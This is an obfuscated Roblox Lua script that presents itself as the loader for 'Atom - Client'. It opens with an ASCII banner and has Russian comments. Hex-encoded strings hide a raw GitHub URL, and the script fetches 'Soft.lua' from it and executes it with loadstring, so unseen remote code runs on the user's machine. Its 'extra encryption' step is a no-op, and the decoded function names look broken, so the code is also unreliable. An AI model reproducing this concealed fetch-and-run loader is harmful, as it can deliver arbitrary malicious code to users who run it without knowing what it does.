--[[ 
░█████╗░████████╗░█████╗░███╗░░░███╗  ░░░░░░
██╔══██╗╚══██╔══╝██╔══██╗████╗░████║  ░░░░░░
███████║░░░██║░░░██║░░██║██╔████╔██║  █████╗
██╔══██║░░░██║░░░██║░░██║██║╚██╔╝██║  ╚════╝
██║░░██║░░░██║░░░╚█████╔╝██║░╚═╝░██║  ░░░░░░
╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝  ░░░░░░

██████╗░██████╗░░█████╗░████████╗███████╗░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
██████╔╝██████╔╝██║░░██║░░░██║░░░█████╗░░██║░░╚═╝░░░██║░░░██║██║░░██║██╔██╗██║
██╔═══╝░██╔══██╗██║░░██║░░░██║░░░██╔══╝░░██║░░██╗░░░██║░░░██║██║░░██║██║╚████║
██║░░░░░██║░░██║╚█████╔╝░░░██║░░░███████╗╚█████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝]]
-- Please leave this page as you have attempted to view the source code of Atom - Client.

-- Непонятные имена для функций и переменных
local x0 = "68747470733a2f2f7261772e6769746875622e636f6d2f736466333237336564333865793233386432336432386432337564396a333839647532336a642f3266343537686b6433323361746f6d2f6d61696e2f536f66742e6c7561"
local x1 = "4777696e486b68774f6d6b7a4668"
local x2 = "4c6d77356c6b6466725978647a5161"

-- Функция для декодирования шестнадцатеричных строк
local function x3(s)
    return (s:gsub('..', function(cc)
        return string.char(tonumber(cc, 16))
    end))
end

-- Декодируем строки
local x4 = x3(x0)
local x5 = x3(x1)
local x6 = x3(x2)

-- Дополнительное шифрование ключевых слов
local function x7(s)
    return (s:gsub('.', function(c)
        return string.char(((string.byte(c) - 33 + 94) % 94) + 33)
    end))
end

-- Дополнительные уровни шифрования
local x8 = x7(x1)
local x9 = x7(x2)

-- Выполняем загрузку и выполнение кода
local success, script = pcall(function()
    local content = getfenv()[x8](game, x4)
    if content then
        warn("Successfully loaded script")
        return content
    else
        warn("Failed to load script")
        return nil
    end
end)

if success and script then
    local success, result = pcall(loadstring(script))
    if success then
        warn("Script executed successfully")
    else
        warn("Failed to execute script:", result)
    end
else
    warn("Failed to load or execute script")
end
